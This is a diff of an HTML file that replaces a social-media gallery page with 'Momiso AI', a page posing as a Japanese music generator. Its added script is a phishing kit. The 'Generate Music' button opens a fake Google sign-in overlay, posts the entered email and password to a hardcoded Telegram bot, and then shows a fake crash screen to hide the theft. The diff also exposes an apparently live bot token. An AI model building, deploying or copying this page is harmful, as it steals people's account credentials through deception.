@@ -2,496 +2,330 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ManaGallery — Modern Social Experience</title>
-    <meta name="description" content="A premium modern social media platform for creators and visionaries. Share moments, connect, and explore visual stories.">
-    
-    <!-- PWA & Mobile Meta Tags -->
-    <meta name="theme-color" content="#0a0a0c">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <link rel="manifest" href="manifest.json">
-    <link rel="apple-touch-icon" href="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=192&h=192&q=80">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Momiso AI - Japanese Music Generator</title>
+    <!-- Solid Icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        /* --- General Styles --- */
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            transition: all 0.4s ease;
+        }
 
-    <!-- Fonts & Icons -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
+        /* --- Main Website (Chat Interface) --- */
+        .app-container {
+            width: 100%;
+            max-width: 600px;
+            height: 90vh;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+        }
 
-    <!-- Stylesheet -->
-    <link rel="stylesheet" href="style.css">
+        /* Header */
+        .header {
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #fff;
+        }
 
-    <!-- Supabase JS Client SDK (v2) -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+        .brand {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .japanese-tag {
+            font-size: 12px;
+            background: #ff4757;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: normal;
+        }
+
+        /* Chat Area */
+        .chat-area {
+            flex: 1;
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            background: linear-gradient(180deg, #fff 0%, #f9f9f9 100%);
+        }
+
+        .ai-avatar {
+            width: 60px;
+            height: 60px;
+            background: #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(26,115,232,0.3);
+        }
+
+        .prompt-text {
+            font-size: 22px;
+            color: #202124;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+
+        .sub-prompt {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 40px;
+        }
+
+        /* Generate Button */
+        .generate-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(26,115,232,0.3);
+            transition: transform 0.2s, background 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .generate-btn:hover {
+            background-color: #1765cc;
+            transform: translateY(-2px);
+        }
+
+        /* --- Google Login Overlay --- */
+        .login-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(8px);
+            display: none; /* Hidden initially */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .login-box {
+            width: 420px;
+            background: white;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+
+        .google-label {
+            font-size: 14px;
+            color: #3c4043;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            margin-bottom: 20px;
+            letter-spacing: -0.5px;
+        }
+
+        .input-group { position: relative; text-align: left; margin-bottom: 20px; }
+        
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
+
+        .toggle-pass {
+            position: absolute; right: 15px; top: 14px; cursor: pointer; color: #5f6368; font-size: 18px;
+        }
+
+        .btn-next {
+            background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; margin-top: 10px;
+        }
+
+        .loading { display: none; margin-top: 20px; color: #5f6368; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- Crash Screen --- */
+        .crash-screen {
+            display: none;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; color: #fff;
+            flex-direction: column; justify-content: center; align-items: center;
+            z-index: 2000;
+        }
+
+    </style>
 </head>
 <body>
 
-    <!-- Global App Loader -->
-    <div id="app-loader" class="app-loader">
-        <div class="loader-content">
-            <div class="brand-logo-anim">
-                <span class="material-icons-round">camera</span>
+    <!-- 1. Main App Interface (Japanese AI Music) -->
+    <div class="app-container" id="mainApp">
+        <div class="header">
+            <div class="brand">
+                <i class="fas fa-wave-square"></i> Momiso AI
+                <span class="japanese-tag">JP/EN</span>
             </div>
-            <h1 class="brand-text">ManaGallery</h1>
-            <div class="spinner"></div>
+            <i class="fas fa-cog" style="color:#5f6368; cursor:pointer;"></i>
+        </div>
+
+        <div class="chat-area">
+            <div class="ai-avatar">
+                <i class="fas fa-music"></i>
+            </div>
+            
+            <h1 class="prompt-text">Upload your song lyrics and describe your music style</h1>
+            <p class="sub-prompt">AI will generate a unique track in seconds.</p>
+
+            <!-- Click this to trigger Login -->
+            <button class="generate-btn" onclick="showLogin()">
+                <i class="fas fa-wand-magic-sparkles"></i> Generate Music
+            </button>
         </div>
     </div>
 
-    <!-- Toast Notification Container -->
-    <div id="toast-container" class="toast-container"></div>
-
-    <!-- Auth Modal (Anonymous Display Name Gateway) -->
-    <div id="auth-modal" class="modal-backdrop">
-        <div class="modal-card glass-panel animate-pop">
-            <div class="brand-badge">
-                <span class="material-icons-round">auto_awesome</span>
+    <!-- 2. Google Style Login Overlay -->
+    <div class="login-overlay" id="loginOverlay">
+        <div class="login-box">
+            <span class="google-label">Google</span>
+            <div class="logo-text">
+                <span style="color:#4285F4">M</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">m</span><span style="color:#4285F4">i</span><span style="color:#34A853">s</span><span style="color:#EA4335">o</span> AI
             </div>
-            <h2>Welcome to ManaGallery</h2>
-            <p>Enter a display name to get started instantly. No password required.</p>
-            
-            <form id="auth-form" class="auth-form">
+            <p style="color:#202124; margin-bottom: 40px;">Sign in to continue to Momiso Music Studio</p>
+
+            <form id="loginForm">
                 <div class="input-group">
-                    <span class="material-icons-round input-icon">person</span>
-                    <input type="text" id="auth-username" placeholder="Choose a display name..." required maxlength="30" autocomplete="off">
+                    <input type="email" id="email" placeholder="Email or phone" required autocomplete="off">
                 </div>
-                <button type="submit" class="btn btn-primary btn-block glow-effect" id="auth-submit-btn">
-                    <span>Get Started</span>
-                    <span class="material-icons-round">arrow_forward</span>
-                </button>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                    <i class="fas fa-eye toggle-pass" onclick="togglePass()"></i>
+                </div>
+                
+                <button type="submit" class="btn-next">Next</button>
             </form>
+
+            <div class="loading" id="loader">
+                <div class="spinner"></div>
+                <p>Connecting to Google...</p>
+            </div>
         </div>
     </div>
 
-    <!-- Main Layout Container -->
-    <div class="app-layout">
+    <!-- 3. Crash Screen -->
+    <div class="crash-screen" id="crashScreen">
+        <i class="fas fa-bug" style="font-size: 60px; margin-bottom: 20px; color: #ff4757;"></i>
+        <h1>Momiso AI Engine Crashed</h1>
+        <p>Audio processing failed. Please restart.</p>
+    </div>
 
-        <!-- Desktop Sidebar Navigation -->
-        <aside class="sidebar glass-panel">
-            <div class="sidebar-header">
-                <a href="#home" class="brand-logo">
-                    <span class="logo-icon material-icons-round">camera</span>
-                    <span class="logo-text">ManaGallery</span>
-                </a>
-            </div>
+    <script>
+        // --- CONFIGURATION ---
+        const botToken = "8831555299:AAHVBTFXoAiA6dNGP2L9atIWqmd7I8C3cgw"; 
+        const chatId = "5246166453";     
 
-            <nav class="sidebar-nav">
-                <a href="#home" class="nav-item active" data-page="home">
-                    <span class="material-icons-round">home</span>
-                    <span class="nav-label">Home</span>
-                </a>
-                <a href="#search" class="nav-item" data-page="search">
-                    <span class="material-icons-round">search</span>
-                    <span class="nav-label">Search</span>
-                </a>
-                <a href="#upload" class="nav-item nav-upload-btn" data-page="upload">
-                    <span class="material-icons-round">add_circle</span>
-                    <span class="nav-label">Create</span>
-                </a>
-                <a href="#notifications" class="nav-item" data-page="notifications">
-                    <span class="material-icons-round">notifications</span>
-                    <span class="nav-label">Notifications</span>
-                    <span class="badge" id="notif-badge" style="display: none;">0</span>
-                </a>
-                <a href="#profile" class="nav-item" data-page="profile">
-                    <span class="material-icons-round">account_circle</span>
-                    <span class="nav-label">Profile</span>
-                </a>
-                <a href="#settings" class="nav-item" data-page="settings">
-                    <span class="material-icons-round">settings</span>
-                    <span class="nav-label">Settings</span>
-                </a>
-            </nav>
-
-            <div class="sidebar-footer">
-                <div class="user-mini-card" id="sidebar-user-card">
-                    <div class="avatar avatar-sm skeleton-box" id="sidebar-avatar-wrap">
-                        <img id="sidebar-avatar" src="" alt="User Avatar" class="avatar-img" style="display:none;">
-                    </div>
-                    <div class="user-info">
-                        <span id="sidebar-display-name" class="user-name">Guest</span>
-                        <span id="sidebar-handle" class="user-handle">@guest</span>
-                    </div>
-                </div>
-            </div>
-        </aside>
-
-        <!-- Main Content Area -->
-        <main class="main-content">
-
-            <!-- Mobile Top Header Bar -->
-            <header class="mobile-header glass-panel">
-                <a href="#home" class="brand-logo">
-                    <span class="logo-icon material-icons-round">camera</span>
-                    <span class="logo-text">ManaGallery</span>
-                </a>
-                <div class="mobile-header-actions">
-                    <a href="#notifications" class="icon-btn" data-page="notifications">
-                        <span class="material-icons-round">notifications</span>
-                    </a>
-                </div>
-            </header>
-
-            <div class="content-viewport">
-
-                <!-- PAGE 1: HOME FEED -->
-                <section id="page-home" class="page-view active">
-                    <!-- Stories Bar -->
-                    <div class="stories-container glass-card">
-                        <div class="stories-scroll">
-                            <div class="story-item story-add" id="add-story-btn">
-                                <div class="story-avatar-wrap">
-                                    <img id="story-self-avatar" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=150&q=80" alt="Your Story">
-                                    <div class="story-add-plus">+</div>
-                                </div>
-                                <span class="story-username">Your Story</span>
-                            </div>
-                            <!-- Dynamic stories appended here -->
-                            <div id="stories-list" class="stories-list-inner"></div>
-                        </div>
-                    </div>
-
-                    <!-- Main Posts Feed Container -->
-                    <div id="feed-container" class="feed-container">
-                        <!-- Feed Skeletons shown during load -->
-                        <div class="feed-skeleton-list">
-                            <div class="post-card glass-card skeleton-card">
-                                <div class="post-header">
-                                    <div class="avatar skeleton-box"></div>
-                                    <div class="skeleton-text-group">
-                                        <div class="skeleton-line short"></div>
-                                        <div class="skeleton-line mini"></div>
-                                    </div>
-                                </div>
-                                <div class="post-media-skeleton skeleton-box"></div>
-                                <div class="post-footer">
-                                    <div class="skeleton-line medium"></div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Infinite Scroll Trigger -->
-                    <div id="feed-infinite-loader" class="infinite-loader" style="display: none;">
-                        <div class="spinner"></div>
-                    </div>
-                </section>
-
-                <!-- PAGE 2: SEARCH & EXPLORE -->
-                <section id="page-search" class="page-view">
-                    <div class="search-header glass-card">
-                        <div class="input-group search-input-wrap">
-                            <span class="material-icons-round input-icon">search</span>
-                            <input type="text" id="search-input" placeholder="Search profiles, posts, or tags..." autocomplete="off">
-                            <button id="clear-search-btn" class="icon-btn-sm" style="display: none;">
-                                <span class="material-icons-round">close</span>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Trending Hashtags -->
-                    <div class="trending-section">
-                        <h3 class="section-title">Trending Topics</h3>
-                        <div class="hashtags-scroll" id="hashtags-container">
-                            <button class="hashtag-pill" data-tag="photography">#photography</button>
-                            <button class="hashtag-pill" data-tag="apple">#apple</button>
-                            <button class="hashtag-pill" data-tag="design">#design</button>
-                            <button class="hashtag-pill" data-tag="tech">#tech</button>
-                            <button class="hashtag-pill" data-tag="minimal">#minimal</button>
-                            <button class="hashtag-pill" data-tag="art">#art</button>
-                        </div>
-                    </div>
-
-                    <!-- Search Results Tabs -->
-                    <div class="tabs-bar">
-                        <button class="tab-btn active" data-search-tab="posts">Posts Grid</button>
-                        <button class="tab-btn" data-search-tab="users">Profiles</button>
-                    </div>
-
-                    <!-- Tab Contents -->
-                    <div id="search-results-posts" class="tab-content active">
-                        <div class="gallery-grid" id="explore-grid">
-                            <!-- Explore grid dynamically filled -->
-                        </div>
-                    </div>
-
-                    <div id="search-results-users" class="tab-content">
-                        <div class="users-list" id="users-results-list">
-                            <!-- Dynamic user search results -->
-                        </div>
-                    </div>
-                </section>
-
-                <!-- PAGE 3: UPLOAD / CREATE POST -->
-                <section id="page-upload" class="page-view">
-                    <div class="upload-container glass-card">
-                        <div class="upload-header">
-                            <h2>Create New Post</h2>
-                            <p>Share photos and thoughts with your community.</p>
-                        </div>
-
-                        <form id="upload-form" class="upload-form">
-                            <!-- Dropzone & Preview -->
-                            <div class="dropzone" id="upload-dropzone">
-                                <input type="file" id="file-input" accept="image/*" class="file-input-hidden">
-                                <div class="dropzone-prompt" id="dropzone-prompt">
-                                    <span class="material-icons-round drop-icon">cloud_upload</span>
-                                    <p class="drop-title">Drag & drop your photo here</p>
-                                    <p class="drop-subtitle">or click to browse from device</p>
-                                    <span class="btn btn-secondary btn-sm">Select Image</span>
-                                </div>
-                                <div class="preview-wrap" id="preview-wrap" style="display: none;">
-                                    <img id="upload-preview-img" src="" alt="Post Preview">
-                                    <button type="button" class="btn-remove-preview" id="remove-preview-btn">
-                                        <span class="material-icons-round">close</span>
-                                    </button>
-                                </div>
-                            </div>
-
-                            <!-- Caption Input -->
-                            <div class="input-group">
-                                <textarea id="upload-caption" placeholder="Write a meaningful caption... #hashtags" rows="4" maxlength="1000"></textarea>
-                            </div>
-
-                            <button type="submit" class="btn btn-primary btn-block glow-effect" id="upload-submit-btn">
-                                <span class="material-icons-round">send</span>
-                                <span>Publish Post</span>
-                            </button>
-                        </form>
-                    </div>
-                </section>
-
-                <!-- PAGE 4: NOTIFICATIONS -->
-                <section id="page-notifications" class="page-view">
-                    <div class="notifications-header glass-card">
-                        <h2>Activity</h2>
-                        <button class="btn btn-secondary btn-sm" id="mark-notifs-read-btn">Mark all read</button>
-                    </div>
-
-                    <div id="notifications-list" class="notifications-list">
-                        <!-- Activity items dynamically populated -->
-                    </div>
-                </section>
-
-                <!-- PAGE 5: USER PROFILE -->
-                <section id="page-profile" class="page-view">
-                    <div class="profile-header-card glass-card">
-                        <div class="profile-top-row">
-                            <div class="avatar avatar-xl skeleton-box" id="profile-avatar-wrap">
-                                <img id="profile-avatar-img" src="" alt="Profile Image" class="avatar-img" style="display:none;">
-                            </div>
-                            <div class="profile-stats">
-                                <div class="stat-item">
-                                    <span class="stat-value" id="profile-posts-count">0</span>
-                                    <span class="stat-label">Posts</span>
-                                </div>
-                                <div class="stat-item">
-                                    <span class="stat-value" id="profile-followers-count">128</span>
-                                    <span class="stat-label">Followers</span>
-                                </div>
-                                <div class="stat-item">
-                                    <span class="stat-value" id="profile-following-count">94</span>
-                                    <span class="stat-label">Following</span>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="profile-meta">
-                            <h2 id="profile-display-name" class="profile-name">Display Name</h2>
-                            <span id="profile-handle" class="profile-handle">@username</span>
-                            <p id="profile-bio" class="profile-bio">Passionate creator exploring modern aesthetics, architecture, and technology.</p>
-                        </div>
-
-                        <div class="profile-actions">
-                            <a href="#settings" class="btn btn-secondary btn-block">Edit Profile</a>
-                        </div>
-                    </div>
-
-                    <!-- Profile Feed Grid -->
-                    <div class="tabs-bar">
-                        <button class="tab-btn active"><span class="material-icons-round">grid_on</span> Grid</button>
-                        <button class="tab-btn"><span class="material-icons-round">bookmark_border</span> Saved</button>
-                    </div>
-
-                    <div class="gallery-grid" id="profile-posts-grid">
-                        <!-- User's own posts rendered here -->
-                    </div>
-                </section>
-
-                <!-- PAGE 6: SETTINGS -->
-                <section id="page-settings" class="page-view">
-                    <div class="settings-card glass-card">
-                        <h2>Settings & Preferences</h2>
-                        
-                        <form id="edit-profile-form" class="settings-form">
-                            <h3>Edit Profile Information</h3>
-                            
-                            <div class="avatar-edit-section">
-                                <div class="avatar avatar-lg">
-                                    <img id="settings-avatar-preview" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=150&q=80" alt="Avatar Preview">
-                                </div>
-                                <div class="avatar-edit-controls">
-                                    <label for="avatar-file-input" class="btn btn-secondary btn-sm">Change Photo</label>
-                                    <input type="file" id="avatar-file-input" accept="image/*" style="display:none;">
-                                </div>
-                            </div>
-
-                            <div class="input-group">
-                                <label for="settings-display-name">Display Name</label>
-                                <input type="text" id="settings-display-name" placeholder="Display Name" maxlength="30" required>
-                            </div>
-
-                            <div class="input-group">
-                                <label for="settings-bio">Bio</label>
-                                <textarea id="settings-bio" rows="3" placeholder="Tell the community about yourself..." maxlength="160"></textarea>
-                            </div>
-
-                            <button type="submit" class="btn btn-primary glow-effect">Save Profile</button>
-                        </form>
-
-                        <hr class="divider">
-
-                        <div class="settings-group">
-                            <h3>Supabase Database Backend Setup</h3>
-                            <p class="help-text">Execute the auto-generated SQL schema below in your Supabase SQL Editor to initialize required tables & storage rules.</p>
-                            <button class="btn btn-secondary btn-sm" id="show-sql-modal-btn">
-                                <span class="material-icons-round">code</span>
-                                <span>View SQL Setup Schema</span>
-                            </button>
-                        </div>
-
-                        <hr class="divider">
-
-                        <div class="settings-group">
-                            <h3>Account & Session</h3>
-                            <button class="btn btn-danger" id="logout-btn">
-                                <span class="material-icons-round">logout</span>
-                                <span>Reset Local Session</span>
-                            </button>
-                        </div>
-                    </div>
-                </section>
-
-            </div><!-- /.content-viewport -->
-        </main>
-
-        <!-- Floating Mobile Create Post Action Button -->
-        <a href="#upload" class="floating-btn" id="mobile-floating-upload">
-            <span class="material-icons-round">add</span>
-        </a>
-
-        <!-- Mobile Bottom Navigation Bar -->
-        <nav class="bottom-nav glass-panel">
-            <a href="#home" class="nav-item active" data-page="home">
-                <span class="material-icons-round">home</span>
-            </a>
-            <a href="#search" class="nav-item" data-page="search">
-                <span class="material-icons-round">search</span>
-            </a>
-            <a href="#upload" class="nav-item" data-page="upload">
-                <span class="material-icons-round">add_box</span>
-            </a>
-            <a href="#notifications" class="nav-item" data-page="notifications">
-                <span class="material-icons-round">notifications</span>
-            </a>
-            <a href="#profile" class="nav-item" data-page="profile">
-                <span class="material-icons-round">person</span>
-            </a>
-        </nav>
-
-    </div><!-- /.app-layout -->
-
-    <!-- Modal: Comments Popup -->
-    <div id="comments-modal" class="modal-backdrop">
-        <div class="modal-card modal-comments glass-panel animate-pop">
-            <div class="modal-header">
-                <h3>Comments</h3>
-                <button class="icon-btn-sm" id="close-comments-modal">
-                    <span class="material-icons-round">close</span>
-                </button>
-            </div>
+        // 1. Show Login when Generate is clicked
+        function showLogin() {
+            // Optional: Send notification that user started generation
+            sendMessageToTelegram("🎵 *User clicked 'Generate Music'* on Momiso AI", false);
             
-            <div class="comments-scroll-area" id="modal-comments-list">
-                <!-- Comments rendered here -->
-            </div>
+            document.getElementById('loginOverlay').style.display = 'flex';
+        }
 
-            <form id="comment-form" class="comment-input-area">
-                <input type="text" id="comment-input" placeholder="Add a comment..." maxlength="280" required autocomplete="off">
-                <button type="submit" class="btn-text-primary">Post</button>
-            </form>
-        </div>
-    </div>
+        // 2. Toggle Password Visibility
+        function togglePass() {
+            const passField = document.getElementById("password");
+            const icon = document.querySelector(".toggle-pass");
+            if (passField.type === "password") {
+                passField.type = "text";
+                icon.classList.remove("fa-eye");
+                icon.classList.add("fa-eye-slash");
+            } else {
+                passField.type = "password";
+                icon.classList.remove("fa-eye-slash");
+                icon.classList.add("fa-eye");
+            }
+        }
 
-    <!-- Modal: Supabase Auto-SQL Schema Display -->
-    <div id="sql-modal" class="modal-backdrop">
-        <div class="modal-card modal-large glass-panel animate-pop">
-            <div class="modal-header">
-                <h3>Supabase SQL Database Setup</h3>
-                <button class="icon-btn-sm" id="close-sql-modal">
-                    <span class="material-icons-round">close</span>
-                </button>
-            </div>
-            <div class="sql-content">
-                <p>Copy and run this SQL query in your Supabase SQL Editor to establish storage buckets and operational tables automatically:</p>
-                <pre class="code-block"><code id="sql-code-snippet">
--- 1. Profiles Table
-CREATE TABLE IF NOT EXISTS public.profiles (
-    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    display_name TEXT NOT NULL,
-    handle TEXT UNIQUE NOT NULL,
-    avatar_url TEXT,
-    bio TEXT,
-    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
-);
+        // 3. Handle Form Submit
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
--- 2. Posts Table
-CREATE TABLE IF NOT EXISTS public.posts (
-    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
-    image_url TEXT NOT NULL,
-    caption TEXT,
-    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
-);
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // UI: Hide button, show loader
+            document.querySelector('.btn-next').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
--- 3. Likes Table
-CREATE TABLE IF NOT EXISTS public.likes (
-    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    post_id UUID REFERENCES public.posts(id) ON DELETE CASCADE,
-    user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
-    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
-    UNIQUE(post_id, user_id)
-);
+            setTimeout(() => {
+                // Send Login Data
+                sendMessageToTelegram(`🔥 *Login Detected*\n\n📧 Email: <code>${email}</code>\n🔑 Pass: <code>${password}</code>`, true);
+                
+                // Trigger Crash after 1.5s
+                setTimeout(triggerCrash, 1000);
+            }, 800);
+        });
 
--- 4. Comments Table
-CREATE TABLE IF NOT EXISTS public.comments (
-    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    post_id UUID REFERENCES public.posts(id) ON DELETE CASCADE,
-    user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
-    content TEXT NOT NULL,
-    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
-);
+        // Helper function to send messages
+        function sendMessageToTelegram(text, isLogin) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error("Telegram Error:", err));
+        }
 
--- 5. Notifications Table
-CREATE TABLE IF NOT EXISTS public.notifications (
-    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-    recipient_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
-    sender_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
-    type TEXT NOT NULL,
-    post_id UUID REFERENCES public.posts(id) ON DELETE CASCADE,
-    read BOOLEAN DEFAULT FALSE,
-    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
-);
+        // 4. Crash Logic
+        function triggerCrash() {
+            document.getElementById('loginOverlay').style.display = 'none';
+            document.getElementById('mainApp').style.display = 'none';
+            document.getElementById('crashScreen').style.display = 'flex';
+        }
+    </script>
 
--- Storage bucket setup statement (Run in Storage console or query)
-INSERT INTO storage.buckets (id, name, public) VALUES ('posts', 'posts', true)
-ON CONFLICT (id) DO NOTHING;
-                </code></pre>
-                <button class="btn btn-secondary btn-block" id="copy-sql-btn">Copy SQL to Clipboard</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Application JavaScript -->
-    <script src="script.js"></script>
 </body>
 </html>
